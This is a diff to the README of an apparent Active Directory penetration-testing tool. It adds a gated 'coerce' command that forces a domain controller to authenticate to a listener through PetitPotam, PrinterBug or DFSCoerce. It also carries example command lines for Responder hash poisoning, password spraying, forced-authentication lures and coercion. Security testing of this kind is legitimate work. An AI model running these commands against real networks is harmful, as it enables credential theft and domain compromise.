@@ -15,8 +15,8 @@ consumes them. Change it only deliberately, bump `SCHEMA_VERSION`, and log it in
 `docs/DECISIONS.md`.
 
 ## Current status (2026-08-11)
-PRs #1–#4 all merged to `main`. Working, tested (224 tests), builds to a single offline
-`.exe` with `demo / report / live / scan / poison / spray / trigger`. Real findings need `nxc` +
+PRs #1–#4 all merged to `main`. Working, tested (241 tests), builds to a single offline
+`.exe` with `demo / report / live / scan / poison / spray / trigger / coerce`. Real findings need `nxc` +
 `certipy` on PATH; `poison` needs `responder` (Linux/Kali).
 
 ![live 3D graph](docs/screenshots/live-graph.jpg)
@@ -30,8 +30,9 @@ redness/
   discovery.py    # TCP connect-scan -> dispatch only relevant engines (hail-mary); --no-discovery
   scope.py        # parse --targets scope file (IP/host/CIDR per line, # comments)
   crack.py        # capture AS-REP/Kerberoast hashes -> loot files -> crack (hashcat/john)
-  cli.py          # entrypoint: demo / report / live / scan / poison / spray / trigger
+  cli.py          # entrypoint: demo / report / live / scan / poison / spray / trigger / coerce
   spray.py        # gated `spray` command: lockout-aware nxc password spray (intrusive)
+  coerce.py       # gated `coerce` command: RPC forced-auth (PetitPotam/PrinterBug/DFSCoerce) via nxc coerce_plus (intrusive)
   engines/        # tool wrappers -> List[Finding]  (Person A)
     base.py       #   Engine ABC + Target + emit_* helpers
     netexec.py    #   nxc SMB: signing, SMBv1, null/guest, shares
@@ -42,6 +43,7 @@ redness/
     sharehunt.py  #   share secret-hunting: nxc spider_plus + pure classifier (Category.SECRET)
     gpp.py        #   GPP cpassword: nxc -M gpp_password -> recovered creds (meta["credentials"])
     spray.py      #   password spraying: pure pass-pol/hit parsers + lockout-safety math
+    coerce.py     #   coercion: pure coerce_plus parser + coerce_argv + per-vector findings (Category.CONFIG)
     remote.py     #   RDP/WinRM/MSSQL: NLA + exposure + credentialed remote-exec reach (passive)
     ftp.py        #   nxc ftp: anonymous login + exposure/banner
     http_ad.py    #   AD web surfaces (stdlib): /certsrv = ESC8, OWA/EWS, server banner
@@ -93,6 +95,7 @@ python -m redness.cli scan --target dc -u U -p P --hunt-secrets   # spider share
 python -m redness.cli poison --iface eth0 --duration 600   # NetNTLMv2 capture (intrusive; prompts)
 python -m redness.cli spray --target dc -p 'Spring2024!' --auth-user U --auth-pass P  # lockout-aware spray (intrusive; gated)
 python -m redness.cli trigger --host 10.10.0.5 --format html --out lure.html  # forced-auth lure
+python -m redness.cli coerce --target dc -u U -p P --listener 10.10.0.240  # RPC forced-auth coercion (run `poison` on the listener first; intrusive; gated)
 ```
 Hash capture is automatic (AS-REP/Kerberoast via LdapEngine) → written to `loot/`.
 GPP cpasswords are recovered automatically on a credentialed scan (GppEngine → `nxc -M gpp_password`).
@@ -103,6 +106,10 @@ opt-in, gated `redness poison` command
 (LLMNR/NBT-NS poisoning via Responder - intrusive); captured hashes feed the same crack pipeline.
 `redness trigger` generates a UNC forced-authentication lure (html/scf/url) that coerces a
 specific victim to authenticate; run `poison` to capture it (same pipeline). See docs/NETNTLM.md.
+`redness coerce` actively coerces a target (usually a DC) into authenticating to `--listener` via
+RPC (PetitPotam/PrinterBug/DFSCoerce, nxc `coerce_plus`) - the machine-side sibling of `trigger`;
+run `poison` on the listener to capture it. Gated: DC-validation (`--target-not-dc-ok` override) +
+uncredentialed double-gate, audit log in `loot/`. See docs/COERCION.md.
 Build the exe (needs Python >= 3.10.1): `py -3 -m PyInstaller packaging/redness.spec`
 
 ## Adding an engine (the common task)
